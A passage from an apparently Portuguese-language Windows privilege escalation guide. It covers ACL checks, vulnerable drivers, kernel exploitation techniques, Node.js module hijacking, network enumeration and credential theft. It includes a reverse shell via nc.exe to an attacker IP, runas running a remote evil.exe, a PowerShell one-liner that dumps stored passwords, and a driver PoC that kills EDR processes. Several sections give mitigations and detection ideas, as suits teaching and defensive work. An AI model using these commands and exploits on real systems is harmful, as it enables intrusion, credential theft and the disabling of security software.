Verifique as **permissões dos binários** (talvez seja possível sobrescrever um deles e escalar privilégios) e das **pastas** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Caminho de reparo do agente Windows do Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) afeta versões antigas dos agentes Windows do Checkmk que gravavam arquivos de comando em `C:\Windows\Temp` e, quando a substituição falhava, executavam um arquivo preexistente protegido contra gravação. O fornecedor corrigiu o problema nas versões 2.1.0p40, 2.2.0p23, 2.3.0b1 e 2.4.0b1. Verifique o nível completo de patch instalado e se a operação afetada do agente pode ser executada; uma identificação que indique apenas a branch, como `2.1`, não permite determinar se há exposição. A enumeração pode verificar a versão, o estado do serviço e as permissões de Temp sem criar arquivos nem acionar comandos do agente.

#### Revisão do serviço SAML do ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) afetava o build 6210 e anteriores do ADSelfService Plus; o fornecedor corrigiu o problema no build 6211. Ele só é relevante se o SAML SSO **estiver ou tiver estado** habilitado. Portanto, uma entrada de produto instalado ou um caminho de serviço é apenas uma pista, não uma confirmação de vulnerabilidade: confirme o build exato, o histórico de configuração do SAML, a acessibilidade do serviço pela rede e a conta com a qual ele é executado. A execução de código pelo serviço herda os privilégios dessa conta; a execução como SYSTEM exige uma instância executada como SYSTEM. Um arquivo `OfflineBackup_*.ezip` legível no diretório Backup do produto é uma pista separada de backup criptografado, não uma evidência de credenciais utilizáveis nem dessa falha de SAML. Durante a enumeração de rotina, registre seu caminho e as permissões de acesso sem extraí-lo.

#### Limites entre o controlador Jenkins e as contas de domínio

Em um controlador Jenkins Windows, diferencie a permissão para criar ou configurar um job da permissão para iniciá-lo: [o Jenkins documenta esses direitos separadamente como `Job/Create`, `Job/Configure` e `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Um agendamento configurado ou um acionador remoto pode oferecer outra forma de iniciar o build, mas confirme se está habilitado e se o build realmente é executado. A execução ocorre com a identidade do controlador ou do agent selecionado, e uma credencial armazenada só pode ser usada se o job tiver acesso ao escopo dela. Separadamente, verifique o acesso aos metadados de `JENKINS_HOME`: o Jenkins mantém material de credenciais e chaves de criptografia em `credentials.xml`, `secrets/hudson.util.Secret` e `secrets/master.key` ([armazenamento de segredos do Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). A presença desses arquivos, por si só, não revela uma senha; verifique o **acesso de leitura aos arquivos necessários** e um caminho distinto de reutilização de conta, sem imprimir segredos em saídas compartilhadas. Se essa conta tiver direito de gravação em `scriptPath` do objeto de usuário do AD, confirme que o caminho do script permite gravação e que existe um consumidor real — logon ou tarefa agendada — executado como o usuário-alvo antes de considerar isso uma execução entre usuários. Qualquer controle adicional de grupo exige a verificação independente dos direitos efetivos no AD.

#### Identidade do agente auto-hospedado do Azure Pipelines

Em um projeto do Azure DevOps Server ou Azure Pipelines, diferencie a permissão para **criar ou editar** um pipeline da permissão para **colocá-lo na fila** e usar o pool de agents selecionado; a [Microsoft documenta separadamente as permissões de pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) e a [autorização do pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Se uma conta com menos privilégios puder enviar uma etapa de script e executar o pipeline em um agent Windows auto-hospedado, a etapa será executada como a [conta do sistema operacional configurada para o agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Antes de alegar uma transição entre usuários ou para SYSTEM, verifique o pipeline exato, as restrições de branch e recursos, o pool autorizado, um job executável e a identidade do serviço do agent. Um agent instalado, uma função no projeto ou acesso de gravação ao repositório, por si só, são apenas pistas; durante a enumeração passiva, revise as permissões e os metadados locais do serviço sem iniciar um build.

#### Credenciais do Microsoft Entra Connect Sync

A [Microsoft distingue](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) a **conta de serviço ADSync**, que executa o serviço de sincronização e acessa o banco de dados SQL, da **conta do conector AD DS**, cujas permissões de diretório dependem dos recursos de sincronização configurados. As credenciais do conector são armazenadas criptografadas nesse banco de dados, com o material de chave [protegido pelo DPAPI sob a conta de serviço ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). A presença de um serviço de sincronização instalado, de um grupo local com nome que sugira privilégios administrativos ou de visibilidade do banco de dados não comprova que as credenciais possam ser descriptografadas nem que seja possível escalar privilégios no domínio. Verifique separadamente os direitos efetivos de leitura do banco de dados, o acesso da conta de serviço e às chaves, a instalação e a estrutura do SQL, a identidade do conector configurada e os privilégios efetivos dessa identidade no AD. A enumeração de rotina deve mostrar apenas metadados do serviço e de acesso, sem consultar nem imprimir os segredos armazenados.

#### Permissões de DLLs de suporte de drivers de impressora

Um driver de impressora instalado pode manter DLLs de suporte em `C:\ProgramData` e carregá-las em um processo de impressão mais privilegiado. Verifique as ACLs exatas do diretório do driver e das DLLs, incluindo diretórios-pai e pontos de nova análise, mesmo que a enumeração de impressoras via WMI esteja bloqueada. Para o [problema do driver de impressora Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), o caminho relatado era `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; a [divulgação original](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) descreve o carregamento de DLL por `PrintIsolationHost.exe`. Uma ACL que permita gravação é apenas uma pista: verifique o acesso efetivo de gravação após considerar as entradas de negação, se o driver relevante está instalado e carrega o arquivo sob uma identidade privilegiada e se o driver atualizado ou o programa de segurança do fornecedor corrigiu a instalação. Não conclua que há vulnerabilidade apenas pelo nome do diretório ou pela versão do driver.

### Permissões de gravação

Verifique se você pode modificar algum arquivo de configuração para ler um arquivo especial ou se pode modificar algum binário que será executado por uma conta de Administrator (schedtasks).

Uma forma de encontrar permissões fracas em pastas/arquivos do sistema é fazer o seguinte:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistência/execução via carregamento automático de plugins do Notepad++

O Notepad++ carrega automaticamente qualquer DLL de plugin nas subpastas `plugins`. Se houver uma instalação portátil/cópia com permissão de escrita, adicionar um plugin malicioso permite a execução automática de código dentro de `notepad++.exe` a cada inicialização (inclusive via `DllMain` e callbacks de plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Executar na inicialização

**Verifique se você consegue sobrescrever algum registro ou binário que será executado por outro usuário.**\
**Leia** a **página a seguir** para saber mais sobre **locais de autorun interessantes para escalar privilégios**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Procure drivers **estranhos/vulneráveis de terceiros**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Se um driver expõe uma primitiva arbitrária de leitura/escrita no kernel (comum em handlers IOCTL mal projetados), você pode escalar privilégios roubando diretamente um token SYSTEM da memória do kernel.<sup>[[13]](#references)</sup> Veja a técnica passo a passo aqui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Para bugs de condição de corrida em que a chamada vulnerável abre um caminho do Object Manager controlado pelo atacante, desacelerar deliberadamente a busca (usando componentes de comprimento máximo ou cadeias profundas de diretórios) pode ampliar a janela de microssegundos para dezenas de microssegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAFs em cancel-safe queues, divulgações de paged-pool e pivôs de I/O ring

Algumas cadeias de LPE no kernel do Windows podem ser construídas a partir de dois bugs individualmente fracos: uma **condição de corrida no tempo de vida de uma cancel-safe queue** que libera uma requisição/CBD enquanto o lock da queue ainda está adquirido, e uma divulgação por **liberação do lock antes da cópia** que expõe uma alocação liberada de paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notas de auditoria e exploração:

- **Liberar com o lock adquirido + cancelar depois**: procure um caminho de sucesso que faça **Acquire -> CompleteRequest/free -> Release**, enquanto o caminho de cancelamento faz **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Se o caminho de sucesso alcançar `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` antes de liberar o lock de CBDQ/CSQ, uma thread bloqueada em `NtCancelIoFileEx -> IopCsqCancelRoutine` pode ser retomada depois e passar um `PFLT_CALLBACK_DATA` já liberado para o callback de remoção do driver.
- **Reaproveitar o objeto de queue liberado** com uma alocação paged-pool controlada pelo atacante e do mesmo tamanho. Entradas de Data Queue do `NPFS` são úteis porque o payload e o tamanho são controláveis, e depois podem ser sondadas com operações de leitura/peek de pipe. Se o objeto liberado incorporar links de lista, sobrescreva-os com uma **lista cíclica de nós de requisição falsos na memória do usuário** para que o driver processe repetidamente estruturas de requisição definidas pelo atacante, em vez de parar no cabeçalho original da lista.
- **Aprimorar uma escrita previsível**: se a requisição falsa redirecionar um ponteiro de contexto aninhado usado por escritas de bookkeeping (timestamps / QPC / campos adjacentes a refcount), você pode obter uma escrita no kernel **com endereço controlado, mas valor não controlado**. Nesse caso, mire no campo **length/size** de um objeto de pool submetido a spray, em vez de um ponteiro final de código/dados, e então enumere o spray até que o objeto corrompido permita uma **leitura out-of-bounds de paged-pool**.
- **Padrão de divulgação sujeito a race**: qualquer syscall que faça `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` é uma forte candidata. A confiabilidade melhora quando o atacante pode aumentar o buffer copiado (por exemplo, adicionando muitas entradas de lista/recurso que aumentem o tamanho final da alocação de um serializador), pois a cópia mais longa amplia a janela de substituição sem necessariamente travar a máquina.
- **Alvos de reposição ricos em ponteiros**: arrays de registered buffers do Windows **I/O ring** são excelentes alvos de divulgação porque o tamanho do paged-pool é controlado pelo atacante (`8 * regBufferCnt`) e cada elemento é um ponteiro do kernel para um `_IOP_MC_BUFFER_ENTRY`. Vaze um desses arrays, recupere o `IORING_OBJECT` ao redor e então corrompa **`RegBuffers`** e **`RegBuffersCount`** para que operações subsequentes do I/O ring consumam entradas forjadas pelo atacante e forneçam leitura/escrita arbitrária no kernel. Se a única escrita disponível fornecer um byte estável (por exemplo, de `KUSER_SHARED_DATA+0x14`), use **escritas desalinhadas sobrepostas** para construir um ponteiro de usuário com bytes repetidos, como `0x0101010101010101`, mapeie-o com `VirtualAlloc` e coloque ali o array de registered buffers forjado.<sup>[[30]](#references)</sup>

Indicadores úteis de depuração:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Depois de obter leitura/gravação arbitrária do kernel por meio do I/O ring corrompido, roube um token SYSTEM usando o fluxo de trabalho padrão de pós-exploração:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivas de corrupção de memória de hive do Registry

Vulnerabilidades modernas em hives permitem organizar layouts determinísticos, abusar de descendentes graváveis de HKLM/HKU e converter corrupção de metadados em overflows de kernel paged-pool sem um driver personalizado. Aprenda a cadeia completa aqui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusão de tipos no modo direto de `RtlQueryRegistryValues` causada por caminhos controlados pelo atacante

Alguns drivers aceitam um caminho do Registry fornecido pelo userland, validam apenas se ele é uma string UTF-16 válida e, em seguida, chamam `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` com `RTL_QUERY_REGISTRY_DIRECT` para gravar em um escalar na stack, como `int readValue`. Se `RTL_QUERY_REGISTRY_TYPECHECK` estiver ausente, `EntryContext` é interpretado de acordo com o tipo **real** do Registry, não com o tipo esperado pelo desenvolvedor.

Isso cria duas primitivas úteis:<sup>[[24]](#references)[[25]](#references)</sup>

- **Deputy confuso / oracle**: um caminho absoluto `\Registry\...` controlado pelo usuário permite que o driver consulte chaves escolhidas pelo atacante, revele sua existência por meio de códigos de retorno/logs e, às vezes, leia valores aos quais o chamador não teria acesso direto.
- **Corrupção de memória do kernel**: um destino escalar, como `&readValue`, passa a ser interpretado com tipos diferentes, como `REG_QWORD`, `UNICODE_STRING` ou um buffer binário de tamanho definido, dependendo do tipo do valor no Registry.

Notas práticas de exploração:

- **Mitigação do Windows 8+**: se a consulta atingir um **hive não confiável** com `RTL_QUERY_REGISTRY_DIRECT`, mas sem `RTL_QUERY_REGISTRY_TYPECHECK`, os chamadores do kernel falham com `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para manter a explorabilidade, procure **chaves graváveis por um atacante dentro de hives de sistema confiáveis**, em vez de preparar valores em `HKCU`.
- **Preparação em hive confiável**: use NtObjectManager para enumerar descendentes graváveis de `\Registry\Machine` e execute novamente a varredura com um token **de baixa integridade** duplicado para encontrar chaves acessíveis em contextos sandboxed:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uma gravação direta de 8 bytes em um `int` de 4 bytes corrompe dados adjacentes na pilha e pode sobrescrever parcialmente um ponteiro de callback/função próximo.
- **`REG_SZ` / `REG_EXPAND_SZ`**: o modo direto espera que `EntryContext` aponte para uma `UNICODE_STRING`. Se o código primeiro carregar um `REG_DWORD` controlado pelo atacante em um escalar na pilha e depois reutilizar o mesmo buffer para uma leitura de string, o atacante controla `Length`/`MaximumLength` e influencia parcialmente o ponteiro `Buffer`, resultando em uma gravação semicontrolada no kernel.
- **`REG_BINARY`**: para dados binários grandes, o modo direto trata o primeiro `LONG` em `EntryContext` como um tamanho de buffer com sinal. Se uma leitura anterior de `REG_DWORD` deixar um valor **negativo** controlado pelo atacante no escalar reutilizado, a consulta seguinte de `REG_BINARY` copia os bytes do atacante diretamente sobre slots adjacentes da pilha, o que costuma ser o caminho mais simples para sobrescrever totalmente um ponteiro de callback.

Padrão forte para hunting: **leituras heterogêneas do registro na mesma variável da pilha sem reinicializá-la**. Procure por `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponteiros `EntryContext` reutilizados e caminhos de código em que a primeira leitura do registro controla se uma segunda leitura acontece.

#### Abusando da ausência de FILE_DEVICE_SECURE_OPEN em objetos de dispositivo (LPE + EDR kill)

Alguns drivers de terceiros assinados criam seu objeto de dispositivo com um SDDL forte usando IoCreateDeviceSecure, mas esquecem de definir FILE_DEVICE_SECURE_OPEN em DeviceCharacteristics. Sem essa flag, a DACL segura não é aplicada quando o dispositivo é aberto por um caminho que contém um componente extra, permitindo que qualquer usuário sem privilégios obtenha um handle usando um caminho de namespace como:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (de um caso real)

Quando um usuário consegue abrir o dispositivo, os IOCTLs privilegiados expostos pelo driver podem ser abusados para LPE e adulteração. Exemplos de recursos observados em situações reais:
- Retornar handles com acesso total a processos arbitrários (roubo de token / shell SYSTEM via DuplicateTokenEx/CreateProcessAsUser).
- Leitura/gravação irrestrita em disco bruto (adulteração offline, truques de persistência no boot).
- Encerrar processos arbitrários, inclusive Protected Process/Light (PP/PPL), permitindo eliminar AV/EDR a partir do user land via kernel.

Padrão mínimo de PoC (modo de usuário):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigações para desenvolvedores
- Sempre defina FILE_DEVICE_SECURE_OPEN ao criar objetos de dispositivo que devem ser restringidos por uma DACL.
- Valide o contexto do chamador para operações privilegiadas. Adicione verificações de PP/PPL antes de permitir a finalização de processos ou o retorno de handles.
- Restrinja IOCTLs (máscaras de acesso, METHOD_*, validação de entrada) e considere modelos com broker em vez de privilégios diretos no kernel.

Ideias de detecção para defensores
- Monitore aberturas no modo de usuário de nomes de dispositivos suspeitos (por exemplo, \\ .\\amsdk*) e sequências específicas de IOCTLs indicativas de abuso.
- Aplique a lista de bloqueio de drivers vulneráveis da Microsoft (HVCI/WDAC/Smart App Control) e mantenha suas próprias listas de permissão/bloqueio.


## PATH DLL Hijacking

Se você tiver **permissões de gravação em uma pasta presente no PATH**, poderá conseguir sequestrar uma DLL carregada por um processo e **escalar privilégios**.<sup>[[2]](#references)</sup>

Verifique as permissões de todas as pastas no PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Para obter mais informações sobre como abusar dessa verificação:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Sequestro da resolução de módulos do Node.js / Electron via `C:\node_modules`

Esta é uma variante de **Windows uncontrolled search path** que afeta aplicações **Node.js** e **Electron** quando elas fazem uma importação bare, como `require("foo")`, e o módulo esperado está **ausente**.<sup>[[20]](#references)</sup>

O Node resolve pacotes percorrendo a árvore de diretórios e verificando as pastas `node_modules` em cada diretório pai. No Windows, essa busca pode chegar à raiz da unidade, então uma aplicação iniciada de `C:\Users\Administrator\project\app.js` pode acabar verificando:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Se um **usuário com poucos privilégios** puder criar `C:\node_modules`, poderá inserir um arquivo `foo.js` malicioso (ou uma pasta de pacote) e aguardar que um **processo Node/Electron com privilégios mais altos** resolva a dependência ausente. O payload é executado no contexto de segurança do processo vítima, o que resulta em **LPE** sempre que o alvo é executado como administrador, por uma tarefa agendada elevada ou por um wrapper de serviço, ou por uma aplicação de desktop privilegiada iniciada automaticamente.

Isso é especialmente comum quando:

- uma dependência é declarada em `optionalDependencies`<sup>[[22]](#references)</sup>
- uma biblioteca de terceiros envolve `require("foo")` em `try/catch` e continua após uma falha
- um pacote foi removido de builds de produção, omitido durante o empacotamento ou não foi instalado
- o `require()` vulnerável está profundamente aninhado na árvore de dependências, em vez de estar no código principal da aplicação

### Buscando alvos vulneráveis

Use o **Procmon** para comprovar o caminho de resolução:<sup>[[23]](#references)</sup>

- Filtre por `Process Name` = executável alvo (`node.exe`, o EXE da aplicação Electron ou o processo wrapper)
- Filtre por `Path` `contains` `node_modules`
- Concentre-se em `NAME NOT FOUND` e na abertura bem-sucedida final em `C:\node_modules`

Padrões úteis para revisão de código em arquivos `.asar` extraídos ou no código-fonte da aplicação:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifique o **nome do pacote ausente** usando o Procmon ou revisando o código-fonte.
2. Crie o diretório de busca na raiz, caso ainda não exista:

```powershell
mkdir C:\node_modules
```

3. Coloque um módulo com o nome exato esperado:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Acione o aplicativo da vítima. Se o aplicativo tentar executar `require("foo")` e o módulo legítimo estiver ausente, o Node poderá carregar `C:\node_modules\foo.js`.

Exemplos reais de módulos opcionais ausentes que se encaixam nesse padrão incluem `bluebird` e `utf-8-validate`, mas a **technique** é a parte reutilizável: encontre qualquer **missing bare import** que um processo privilegiado do Windows com Node/Electron resolverá.

### Ideias de detecção e hardening

- Gere um alerta quando um usuário criar `C:\node_modules` ou gravar novos arquivos/pacotes `.js nesse local.
- Procure processos de alta integridade que leem de `C:\node_modules\*`.
- Inclua todas as dependências de runtime nos pacotes de produção e audite o uso de `optionalDependencies`.
- Revise código de terceiros em busca de padrões silenciosos `try { require("...") } catch {}`.
- Desative sondagens opcionais quando a biblioteca permitir (por exemplo, algumas implementações de `ws` podem evitar a sondagem legada de `utf-8-validate` com `WS_NO_UTF_8_VALIDATE=1`).

## Rede

### Compartilhamentos

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### arquivo hosts

Verifique se há outros computadores conhecidos codificados diretamente no arquivo hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfaces de Rede e DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Portas abertas

Verifique **serviços restritos** de fora.

```bash
netstat -ano #Opened ports?
```

Para um listener local, correlacione seu PID com o proprietário do processo, o caminho do executável e qualquer serviço ou tarefa agendada que o inicie. Um serviço de controle remoto só pode conceder acesso como o usuário da sessão se os controles de autenticação e de comandos permitirem. Um aplicativo TCP personalizado executado com uma conta de privilégios mais altos é um alvo de análise separado: o listener e o caminho do binário são indícios passivos, enquanto uma rota autenticada de corrupção de memória exige a análise desse binário específico e das entradas às quais ele pode ser exposto. Se uma porta exposta parecer pertencer a um processo do sistema, compare-a com [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) antes de atribuí-la ao serviço de backend; uma regra de encaminhamento, por si só, não prova que o destino está acessível ou é vulnerável.

### Tabela de roteamento

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Regras de Firewall

[**Consulte esta página para ver comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desativar, desativar...)**

Mais[ comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)

### Subsistema do Windows para Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

O binário `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se você obtiver o usuário root, poderá escutar em qualquer porta (na primeira vez que usar `nc.exe` para escutar em uma porta, uma janela da interface gráfica perguntará se o `nc` deve ser permitido pelo firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Para iniciar facilmente o bash como root, você pode tentar `--default-user root`

Você pode explorar o sistema de arquivos do `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

O `root` do Linux dentro do WSL não concede, por si só, direitos de Administrador do Windows. Se a identidade atual do Windows puder ler o sistema de arquivos de uma distribuição, verifique os arquivos de histórico do shell (incluindo `/root/.bash_history`) em busca de comandos que possam ter registrado credenciais; a escalada ainda exige uma conta válida com privilégios mais altos e um método de autenticação permitido. O layout `LocalState\rootfs` se aplica a instalações mais antigas do WSL; o WSL 2 costuma armazenar a distribuição em um [disco virtual `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), portanto, primeiro identifique a distribuição e o caminho de armazenamento reais. Evite exibir o conteúdo do histórico durante a enumeração automatizada.

## Credenciais do Windows

### Credenciais do Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Trate `DefaultUserName` e `DefaultDomainName` como contexto da conta, não como credenciais. Um valor não vazio em `DefaultPassword` ou `AltDefaultPassword` é uma descoberta de senha em texto simples no registro. Se `AutoAdminLogon=1`, mas nenhuma senha em texto simples puder ser lida, isso é apenas uma pista: [Sysinternals Autologon pode armazenar a senha como um segredo LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), e leituras comuns do registro não permitem determinar se esse segredo existe ou pode ser recuperado. Verifique os direitos de acesso e a configuração real de logon antes de relatar uma exposição de credenciais.

### Gerenciador de Credenciais / Windows Vault

De [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
O Windows Vault armazena credenciais para servidores, sites e outros programas que o **Windows** pode usar para **fazer logon dos usuários automaticamente**. À primeira vista, isso pode parecer indicar que os usuários podem armazenar credenciais de sites como Facebook, Twitter ou Gmail e fazer com que os navegadores iniciem sessão automaticamente, mas não é assim que funciona.

O Windows Vault armazena credenciais que o Windows pode usar para fazer logon dos usuários automaticamente. Isso significa que qualquer **aplicativo do Windows que precise de credenciais para acessar um recurso** (servidor ou site) **pode usar este Credential Manager** e o Windows Vault, aproveitando as credenciais fornecidas em vez de os usuários terem de inserir o nome de usuário e a senha o tempo todo.

A menos que os aplicativos interajam com o Credential Manager, não acredito que seja possível usarem as credenciais de um determinado recurso. Portanto, se o seu aplicativo quiser usar o vault, deverá de alguma forma **se comunicar com o Credential Manager e solicitar as credenciais desse recurso** no vault de armazenamento padrão.

Use `cmdkey` para listar as credenciais armazenadas na máquina.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Em seguida, você pode usar `runas` com a opção `/savecred` para usar as credenciais salvas. O exemplo a seguir chama um binário remoto por meio de um compartilhamento SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Usando `runas` com um conjunto de credenciais fornecido.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Observe que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ou o [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Aplicativos UWP modernos do Windows, o Microsoft Edge e serviços modernos do sistema armazenam tokens de autenticação e senhas em texto simples no `PasswordVault` da Universal Windows Platform (UWP) (também exposto como `Web Credentials` em `vaultcmd`). Esse espaço de armazenamento é isolado por sessão e pode ser descriptografado nativamente, sem privilégios administrativos ou `SeDebugPrivilege`.

Execute este comando do PowerShell na sessão ativa do usuário para fazer o dump e descriptografar instantaneamente todos os nomes de usuário e senhas em texto simples armazenados:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

A **Data Protection API (DPAPI)** fornece um método para criptografia simétrica de dados, usado predominantemente no sistema operacional Windows para a criptografia simétrica de chaves privadas assimétricas. Essa criptografia utiliza um segredo do usuário ou do sistema para contribuir significativamente para a entropia.

**A DPAPI permite criptografar chaves por meio de uma chave simétrica derivada dos segredos de login do usuário**. Em cenários que envolvem criptografia do sistema, ela utiliza os segredos de autenticação de domínio do sistema.

